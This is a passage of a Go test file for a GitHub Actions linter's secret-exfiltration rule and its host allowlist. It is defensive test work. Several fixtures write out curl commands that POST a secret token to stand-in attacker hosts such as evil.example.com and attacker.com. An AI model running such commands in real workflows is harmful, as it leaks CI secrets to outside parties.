				t.Errorf("normalizeAllowedHost(%q) reason = %q, want empty for accepted entry", tt.input, reason)
			}
			continue
		}
		if !strings.Contains(reason, tt.wantReasonContains) {
			t.Errorf("normalizeAllowedHost(%q) reason = %q, want substring %q", tt.input, reason, tt.wantReasonContains)
		}
	}
}

func TestUserHostAllowlistMatch(t *testing.T) {
	allowed := []string{"api.example.com", "*.trusted.example.org"}
	tests := []struct {
		host    string
		want    string
		wantHit bool
	}{
		{"api.example.com", "api.example.com", true},
		{"API.Example.com", "api.example.com", true},
		{"sub.trusted.example.org", "*.trusted.example.org", true},
		// Apex is NOT covered by "*.trusted.example.org" (RFC 9525, which
		// obsoletes RFC 6125, plus RFC 4592 semantics). Users must list
		// "trusted.example.org" separately.
		{"trusted.example.org", "", false},
		{"untrusted.example.org", "", false},
		{"api.example.com.attacker.com", "", false},
		{"", "", false},
	}
	for _, tt := range tests {
		got, ok := userHostAllowlistMatch(tt.host, allowed)
		if ok != tt.wantHit || got != tt.want {
			t.Errorf("userHostAllowlistMatch(%q) = (%q, %v), want (%q, %v)", tt.host, got, ok, tt.want, tt.wantHit)
		}
	}
}

// TestSecretExfiltration_AllowedHosts_DynamicDestinationSuppressesDeadAllow
// covers the PR #477 review finding: when the workflow contains a network
// command whose destination cannot be statically resolved (e.g. `$URL`),
// dead-allow warnings for per-workflow directive entries are suppressed —
// the entry may match the runtime value the analyzer cannot see.
func TestSecretExfiltration_AllowedHosts_DynamicDestinationSuppressesDeadAllow(t *testing.T) {
	rule := NewSecretExfiltrationRule()
	rule.UpdateConfig(&Config{})

	wf := &ast.Workflow{
		BaseNode: &yaml.Node{
			Kind:        yaml.DocumentNode,
			HeadComment: "# sisakulint:secret-exfiltration.allowed-hosts: api.example.com",
			Line:        1,
			Column:      1,
		},
	}
	_ = rule.VisitWorkflowPre(wf)

	step := &ast.Step{
		Exec: &ast.ExecRun{
			Run: &ast.String{
				Value: `URL=$RESOLVED; curl -X POST "$URL" -d "token=${{ secrets.X }}"`,
				Pos:   &ast.Position{Line: 1, Col: 1},
			},
		},
	}
	job := &ast.Job{Steps: []*ast.Step{step}}
	_ = rule.VisitJobPre(job)
	_ = rule.VisitWorkflowPost(wf)

	for _, e := range rule.Errors() {
		if strings.Contains(e.Description, "did not match any network command destination") {
			t.Errorf("dead-allow warning should be suppressed when destination is dynamic, got %q", e.Description)
		}
	}
}

// TestSecretExfiltration_AllowedHosts_IPv6 verifies that IPv6 hosts can be
// added to the allowlist using either the bracketed `[::1]` form or the
// bare `::1` form, and that they match curl URLs written with brackets.
func TestSecretExfiltration_AllowedHosts_IPv6(t *testing.T) {
	cases := []struct {
		name    string
		entry   string
		dest    string
		matched bool
	}{
		{"bracketed entry matches bracketed url", "[::1]", "https://[::1]/foo", true},
		{"bare entry matches bracketed url", "::1", "https://[::1]/foo", true},
		{"different ipv6 does not match", "::1", "https://[2001:db8::1]/foo", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			script := `curl -X POST ` + tc.dest + ` -d "token=${{ secrets.X }}"`
			got := runSecretExfiltrationRuleWithAllowedHosts(script, []string{tc.entry})
			// Filter out dead-allow / invalid-entry noise.
			findings := 0
			for _, e := range got {
				d := e.Description
				if strings.Contains(d, "did not match any network command destination") {
					continue
				}
				if strings.Contains(d, "is invalid and was ignored") {
					continue
				}
				findings++
			}
			want := 0
			if !tc.matched {
				want = 1
			}
			if findings != want {
				t.Errorf("ipv6 allowlist %q vs %q: got %d findings, want %d (errors=%v)", tc.entry, tc.dest, findings, want, got)
			}
		})
	}
}

// TestSecretExfiltration_AllowedHosts_InvalidEntryWarning covers the PR #477
// review finding: entries that fail normalization (scheme, port, embedded
// wildcard, etc.) must surface as a diagnostic rather than being silently
// dropped.
func TestSecretExfiltration_AllowedHosts_InvalidEntryWarning(t *testing.T) {
	invalidInputs := []string{
		"https://api.example.com",
		"api.example.com:443",
		"api.example.*",
		"foo bar",
	}
	script := `curl -X POST https://api.example.com -d "token=${{ secrets.X }}"`
	got := runSecretExfiltrationRuleWithAllowedHosts(script, invalidInputs)
	warnings := 0
	for _, e := range got {
		if strings.Contains(e.Description, "is invalid and was ignored") {
			warnings++
		}
	}
	if warnings != len(invalidInputs) {
		t.Errorf("expected %d invalid-entry warnings, got %d: %v", len(invalidInputs), warnings, got)
	}
}

// TestSecretExfiltration_AllowedHosts_DirectiveMissingCommaIsRejected locks
// in the comma-only separator behavior for the directive payload. A missing
// comma between two host names produces a single entry that fails
// normalization (whitespace inside a host) rather than silently expanding
// into two valid allowlist entries. This protects the dead-allow invariant
// that the allowlist must not silently widen suppression scope.
func TestSecretExfiltration_AllowedHosts_DirectiveMissingCommaIsRejected(t *testing.T) {
	rule := NewSecretExfiltrationRule()
	rule.UpdateConfig(&Config{})

	wf := &ast.Workflow{
		BaseNode: &yaml.Node{
			Kind: yaml.DocumentNode,
			// Missing comma between the two hosts. With whitespace as a
			// separator this would silently become two entries; with
			// comma-only it stays as one invalid entry instead.
			HeadComment: "# sisakulint:secret-exfiltration.allowed-hosts: api.example.com other.example.com",
			Line:        1,
			Column:      1,
		},
	}
	_ = rule.VisitWorkflowPre(wf)

	step := &ast.Step{
		Exec: &ast.ExecRun{
			Run: &ast.String{
				Value: `curl -X POST https://api.example.com -d "token=${{ secrets.X }}"`,
				Pos:   &ast.Position{Line: 1, Col: 1},
			},
		},
	}
	job := &ast.Job{Steps: []*ast.Step{step}}
	_ = rule.VisitJobPre(job)
	_ = rule.VisitWorkflowPost(wf)

	var invalidWarnings, deadAllowWarnings, exfilFindings int
	for _, e := range rule.Errors() {
		switch {
		case strings.Contains(e.Description, "is invalid and was ignored"):
			invalidWarnings++
		case strings.Contains(e.Description, "did not match any network command destination"):
			deadAllowWarnings++
		default:
			exfilFindings++
		}
	}
	if invalidWarnings != 1 {
		t.Errorf("expected 1 invalid-entry warning for the missing-comma typo, got %d: %v", invalidWarnings, rule.Errors())
	}
	if deadAllowWarnings != 0 {
		t.Errorf("expected 0 dead-allow warnings (the typo entry is invalid, not unused), got %d: %v", deadAllowWarnings, rule.Errors())
	}
	// The curl call hits api.example.com, but the only directive entry was
	// invalid and dropped, so the finding must still fire.
	if exfilFindings != 1 {
		t.Errorf("expected the exfiltration finding to fire (no valid allowlist entry), got %d: %v", exfilFindings, rule.Errors())
	}
}

// TestSecretExfiltration_AllowedHosts_DirectiveScopedToTopLevel locks in the
// PR #477 review fix: an allowed-hosts directive attached to a deep yaml
// node (e.g. a step's LineComment) must NOT be honored. Only directives at
// the workflow file's top-level scope take effect, so reviewers can audit
// the suppression surface from the file header.
func TestSecretExfiltration_AllowedHosts_DirectiveScopedToTopLevel(t *testing.T) {
	// Build a workflow whose root carries no directive but a deeply nested
	// step comment carries one. The expected behavior is that the directive
	// is ignored and the curl call to evil.example.com fires a finding.
	rule := NewSecretExfiltrationRule()
	rule.UpdateConfig(&Config{})

	deepStepKey := &yaml.Node{Kind: yaml.ScalarNode, Value: "name", LineComment: "# sisakulint:secret-exfiltration.allowed-hosts: evil.example.com"}
	deepStepVal := &yaml.Node{Kind: yaml.ScalarNode, Value: "Deep step"}
	deepStepNode := &yaml.Node{Kind: yaml.MappingNode, Content: []*yaml.Node{deepStepKey, deepStepVal}}

	root := &yaml.Node{
		Kind: yaml.MappingNode,
		Content: []*yaml.Node{
			{Kind: yaml.ScalarNode, Value: "on"}, {Kind: yaml.ScalarNode, Value: "push"},
			{Kind: yaml.ScalarNode, Value: "jobs"}, deepStepNode,
		},
		Line: 1, Column: 1,
	}
	doc := &yaml.Node{Kind: yaml.DocumentNode, Content: []*yaml.Node{root}}

	wf := &ast.Workflow{BaseNode: doc}
	_ = rule.VisitWorkflowPre(wf)

	step := &ast.Step{
		Exec: &ast.ExecRun{
			Run: &ast.String{
				Value: `curl -X POST https://evil.example.com -d "token=${{ secrets.X }}"`,
				Pos:   &ast.Position{Line: 1, Col: 1},
			},
		},
	}
	job := &ast.Job{Steps: []*ast.Step{step}}
	_ = rule.VisitJobPre(job)
	_ = rule.VisitWorkflowPost(wf)

	foundExfiltration := false
	for _, e := range rule.Errors() {
		if strings.Contains(e.Description, "secret-exfiltration") || strings.Contains(e.Description, "exfiltration") || strings.Contains(e.Description, "secret_exfiltration") {
			foundExfiltration = true
		}
	}
	// A simpler signal: count any finding that isn't a meta-warning.
	if !foundExfiltration {
		for _, e := range rule.Errors() {
			if !strings.Contains(e.Description, "did not match") && !strings.Contains(e.Description, "is invalid and was ignored") {
				foundExfiltration = true
				break
			}
		}
	}
	if !foundExfiltration {
		t.Errorf("deep-node directive should NOT suppress the finding, but no exfiltration finding was emitted; errors=%v", rule.Errors())
	}
}

// TestSecretExfiltration_AllowedHosts_MixedDestinations locks in the
// all-or-nothing suppression contract of networkCallMatchesAllowlist: a
// single curl invocation that lists multiple destinations is suppressed
// only when *every* destination matches the allowlist. If even one
// destination is outside the allowlist, the finding must still fire —
// otherwise an attacker could smuggle exfiltration into a call that also
// hits a trusted host.
func TestSecretExfiltration_AllowedHosts_MixedDestinations(t *testing.T) {
	tests := []struct {
		name      string
		script    string
		allowed   []string
		wantCount int
	}{
		{
			// Both destinations are listed in the allowlist: legitimate
			// fan-out to two trusted vendor endpoints.
			name:      "all destinations trusted suppresses finding",
			script:    `curl -X POST https://api.example.com https://other.example.com -d "token=${{ secrets.X }}"`,
			allowed:   []string{"api.example.com", "other.example.com"},
			wantCount: 0,
		},
		{
			// One trusted + one untrusted: must NOT be suppressed.
			name:      "one untrusted destination keeps finding",
			script:    `curl -X POST https://api.example.com https://attacker.com -d "token=${{ secrets.X }}"`,
			allowed:   []string{"api.example.com"},
			wantCount: 1,
		},
		{
			// Wildcard covers both: still suppressed.
			name:      "wildcard covers all destinations",
			script:    `curl -X POST https://api.example.com https://other.example.com -d "token=${{ secrets.X }}"`,
			allowed:   []string{"*.example.com"},
			wantCount: 0,
		},
		{
			// Wildcard covers one, lookalike sneaks past: must still fire.
			// "example.com.attacker.com" is NOT a subdomain of example.com,
			// so the all-or-nothing rule keeps it flagged.
			name:      "wildcard does not cover lookalike second destination",
			script:    `curl -X POST https://api.example.com https://example.com.attacker.com -d "token=${{ secrets.X }}"`,
			allowed:   []string{"*.example.com"},
			wantCount: 1,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := runSecretExfiltrationRuleWithAllowedHosts(tt.script, tt.allowed)
			count := 0
			for _, e := range got {
				if !strings.Contains(e.Description, "did not match any network command destination") {
					count++
				}
			}
			if count != tt.wantCount {
				t.Errorf("%s: expected %d findings, got %d: %v", tt.name, tt.wantCount, count, got)
			}
		})
	}
}
